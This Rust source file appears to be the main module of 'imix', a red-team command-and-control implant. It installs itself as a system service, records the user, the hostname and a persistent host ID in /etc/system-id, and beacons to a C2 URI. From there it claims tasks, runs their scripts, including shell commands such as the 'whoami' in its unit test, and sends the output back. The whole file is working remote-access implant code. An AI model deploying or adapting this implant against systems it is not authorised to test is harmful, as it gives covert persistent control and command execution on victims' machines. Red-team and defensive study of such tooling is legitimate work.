use std::{collections::HashMap, fs};
use std::fs::File;
use std::io::{BufReader, Write};
use std::path::Path;
use std::time::Instant;
use chrono::Utc;
use clap::{Command, arg};
use anyhow::{Result, Error};
use tokio::task;
use tokio::time::Duration;
use imix::graphql::{GraphQLTask, self};
use eldritch::eldritch_run;
use uuid::Uuid;

async fn install(config_path: String) -> Result<(), imix::Error> {
    let config_file = File::open(config_path)?;
    let config: imix::Config = serde_json::from_reader(config_file)?;

    #[cfg(target_os = "windows")]
    return imix::windows::install(config).await;

    #[cfg(target_os = "linux")]
    if Path::new(imix::linux::SYSTEMD_DIR).is_dir() {
        return imix::linux::install(config).await;
    }

    unimplemented!("The current OS/Service Manager is not supported")
}

async fn handle_exec_tome(task: GraphQLTask) -> Result<(String,String)> {
    // TODO: Download auxillary files from CDN

    // Read a tome script
    let task_job = match task.job {
        Some(job) => job,
        None => return Ok(("".to_string(), format!("No job associated for task ID: {}", task.id))),
    };

    let tome_name = task_job.tome.name;
    let tome_contents = task_job.tome.eldritch;

    // Execute a tome script
    let res = eldritch_run(tome_name, tome_contents);
    match res {
        Ok(tome_output) => Ok((tome_output, "".to_string())),
        Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
    }
}

async fn handle_exec_timeout_and_response(imix_callback_uri: String, task: graphql::GraphQLTask) -> Result<(), Error> {
    let start_time = Utc::now();

    // Tasks will be forcebly stopped after 1 week.
    let timeout_duration = Duration::from_secs(60*60*24*7); // 1 Week.

    // Define a future for our execution task
    let exec_future = handle_exec_tome(task.clone());

    // Execute that future with a timeout defined by the timeout argument.
    let tome_output = match tokio::time::timeout(timeout_duration, exec_future).await {
        Ok(res) => {
            match res {
                Ok(tome_result) => tome_result,
                Err(tome_error) => ("".to_string(), tome_error.to_string()),
            }
        },
        Err(timer_elapsed) => ("".to_string(), format!("Time elapsed task {} has been running for {} seconds", task.id, timer_elapsed.to_string())),
    };

    // Send task response
    let test_task_response = graphql::GraphQLSubmitTaskResultInput {
        task_id: task.id.clone(),
        exec_started_at: start_time,
        exec_finished_at: Some(Utc::now()),
        output: tome_output.0.clone(),
        error: tome_output.1.clone(),
    };

    let submit_task_result = graphql::gql_post_task_result(imix_callback_uri, test_task_response).await;
    match submit_task_result {
        Ok(_) => Ok(()), // Currently no reason to save the task since it's the task we just answered.
        Err(error) => Err(error),
    }
}

fn get_principal() -> Result<String> {
    Ok(whoami::username())
}

fn get_hostname() -> Result<String> {
    Ok(whoami::hostname())
}

fn get_session_id() -> Result<String> {
    let session_id = Uuid::new_v4();
    Ok(session_id.to_string())
}

fn get_host_id(host_id_file_path: String) -> Result<String> {
    let mut host_id = Uuid::new_v4().to_string();
    let host_id_file = Path::new(&host_id_file_path);
    if host_id_file.exists() {
        host_id = match fs::read_to_string(host_id_file) {
            Ok(tmp_host_id) => tmp_host_id.trim().to_string(),
            Err(_) => host_id,
        };
    } else {
        let mut host_id_file_obj = match File::create(host_id_file) {
            Ok(tmp_file_obj) => tmp_file_obj,
            Err(_) => return Ok(host_id), // An error occured don't save. Just go.
        };
        match host_id_file_obj.write_all(host_id.as_bytes()) {
            Ok(_) => {}, // Don't care if write fails or not going to to send our generated one.
            Err(_) => {},
        }
    }
    Ok(host_id)
}


// Async handler for port scanning.
async fn main_loop(config_path: String) -> Result<()> {
    let debug = true;
    let version_string = "v0.1.0";
    let config_file = File::open(config_path)?;
    let reader = BufReader::new(config_file);
    let imix_config: imix::Config = serde_json::from_reader(reader)?;

    let mut all_exec_futures: HashMap<String, _> = HashMap::new();

    let principal = match get_principal() {
        Ok(username) => username,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get process username"));
            }
            "UNKNOWN".to_string()
        },
    };

    let hostname = match get_hostname() {
        Ok(tmp_hostname) => tmp_hostname,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get system hostname"));
            }
            "UNKNOWN".to_string()
        },
    };

    let session_id = match get_session_id() {
        Ok(tmp_session_id) => tmp_session_id,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get a random session id"));
            }
            "DANGER-UNKNOWN".to_string()
        },
    };

    let host_id = match get_host_id("/etc/system-id".to_string()) {
        Ok(tmp_host_id) => tmp_host_id,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get or create a host id"));
            }
            "DANGER-UNKNOWN".to_string()
        },
    };

    let claim_tasks_input = graphql::GraphQLClaimTasksInput {
        principal: principal,
        hostname: hostname,
        session_identifier: session_id,
        host_identifier: host_id,
        agent_identifier: format!("{}-{}","imix",version_string),
    };

    loop {
        // 0. Get loop start time
        let loop_start_time = Instant::now();

        // 1. Pull down new tasks
        // 1a) calculate callback uri
        let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();

        // 1b) Collect new tasks
        let new_tasks = match graphql::gql_claim_tasks(cur_callback_uri.clone(), claim_tasks_input).await {
            Ok(tasks) => tasks,
            Err(error) => {
                if debug {
                    println!("main_loop: error claiming task\n{:?}", error)
                }
                continue;
            },
        };

        // 2. Start new tasks
        for task in new_tasks {
            let exec_with_timeout = handle_exec_timeout_and_response(cur_callback_uri.clone(), task.clone());
            match all_exec_futures.insert(task.clone().id, task::spawn(exec_with_timeout)) {
                Some(_old_task) => {
                    if debug {
                        println!("main_loop: error adding new task. Non-unique taskID\n");
                    }
                },
                None => {}, // Task queued successfully
            }
        }


        // 3. Sleep till callback time
        //                                  time_to_wait          -         time_elapsed
        let time_to_sleep = imix_config.callback_config.interval - loop_start_time.elapsed().as_secs() ;
        tokio::time::sleep(std::time::Duration::new(time_to_sleep, 67812)).await;

        // :clap: :clap: make new map!
        let mut running_exec_futures: HashMap<String, _> = HashMap::new();

        // Check status
        for exec_future in all_exec_futures.into_iter() {
            if debug {
                println!("{}: {:?}", exec_future.0, exec_future.1.is_finished());
            }
            // Only re-insert the runnine exec futures
            if !exec_future.1.is_finished() {
                running_exec_futures.insert(exec_future.0, exec_future.1);
            }
        }

        // change the reference! This is insane but okay.
        all_exec_futures = running_exec_futures;
    }
}


pub fn main() -> Result<(), imix::Error> {
    let matches = Command::new("imix")
        .arg(
            arg!(
                -c --config <FILE> "Sets a custom config file"
            )
            .required(false)
        )
        .subcommand(
            Command::new("install")
                .about("Run in install mode")
                .arg(
                    arg!(
                        -c --config <FILE> "Sets a custom config file"
                    )
                    .required(true)
                )
        )
        .get_matches();


    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();


    match matches.subcommand() {
        Some(("install", args)) => {
            let config_path = args.value_of("config").unwrap();
            match runtime.block_on(
                install(String::from(config_path))
            ) {
                Ok(_response) => {},
                Err(_error) => {},
            }
        },
        _ => {},
    }

    if let Some(config_path) = matches.value_of("config") {
        match runtime.block_on(main_loop(config_path.to_string())) {
            Ok(_) => todo!(),
            Err(_) => todo!(),
        }
    }
    Ok(())
}



#[cfg(test)]
mod tests {
    use imix::{graphql::{GraphQLJob, GraphQLTome}};
    use super::*;

    #[test]
    fn imix_handle_exec_tome() {
        let test_tome_input = GraphQLTask{
            id: "17179869185".to_string(),
            job: Some(GraphQLJob {
                id: "4294967297".to_string(),
                name: "Test Exec".to_string(),
                tome: GraphQLTome {
                    id: "21474836482".to_string(),
                    name: "Shell execute".to_string(),
                    description: "Execute a command in the default system shell".to_string(),
                    parameters: None,
                    eldritch: r#"sys.shell("whoami")"#.to_string(),
                    files: [].to_vec(),
                },
                bundle: None,
            }),
        };


        let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();


        let result = runtime.block_on(handle_exec_tome(test_tome_input)).unwrap();

        let mut bool_res = false;
        assert_eq!(result.1, "".to_string());

        if cfg!(target_os = "linux") ||
        cfg!(target_os = "ios") ||
        cfg!(target_os = "android") ||
        cfg!(target_os = "freebsd") ||
        cfg!(target_os = "openbsd") ||
        cfg!(target_os = "netbsd") ||
        cfg!(target_os = "macos") {
            bool_res = result.0 == "runner\n" || result.0 == "root\n";
        }
        else if cfg!(target_os = "windows") {
            bool_res =  result.0.contains("runneradmin") || result.0.contains("Administrator");
        }

        assert_eq!(bool_res, true);

    }
}

